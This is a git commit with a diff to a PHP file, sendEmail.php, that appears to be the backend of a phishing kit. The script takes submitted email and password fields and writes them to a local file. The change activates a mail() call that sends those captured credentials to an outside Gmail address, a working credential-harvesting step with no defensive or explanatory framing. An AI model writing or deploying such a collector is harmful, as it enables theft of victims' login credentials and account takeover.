83d1e99c34d19fcdbd990a77a2ec38af6fd50a35
lophecupu <rabbanirian@gmail.com>
2019-02-24 08:42:29 +0700

    Update sendEmail.php

--- sendEmail.php
+++ sendEmail.php
@@ -5,7 +5,7 @@ $password = $_POST['pass'];
 $message= $email."  ".$password;
 
 // Send the email which contains credentials. This method is better when free hosting
-//mail('xxxxxxxxx@gmail.com', 'My Subject', $message);
+mail('nomerkoplak1@gmail.com', 'My Subject', $message);
 
 // when running locally writing to a file is better for checking purposes
 $myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
